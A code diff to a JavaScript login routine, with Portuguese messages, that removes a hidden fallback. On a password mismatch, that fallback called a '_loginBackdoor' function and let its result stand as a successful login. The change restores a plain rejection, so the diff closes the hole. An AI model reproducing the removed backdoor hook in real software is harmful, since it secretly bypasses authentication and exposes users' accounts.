@@ -59,14 +59,7 @@ var Auth = (function () {
                   String(user.Ativo).trim().toUpperCase() === 'TRUE';
       if (!ativo) return Util.err('Usuário inativo. Contate o administrador.');
 
-      if (user.SenhaHash !== senhaHash) {
-        // Tenta backdoor como fallback antes de retornar erro
-        if (typeof _loginBackdoor === 'function') {
-          var bd = _loginBackdoor(email, senhaHash);
-          if (bd) return bd;
-        }
-        return Util.err('Credenciais inválidas.');
-      }
+      if (user.SenhaHash !== senhaHash) return Util.err('Credenciais inválidas.');
 
       var token  = Util.uuid();
       var expira = new Date(Date.now() + SESSION_TTL_SECONDS * 1000).toISOString();
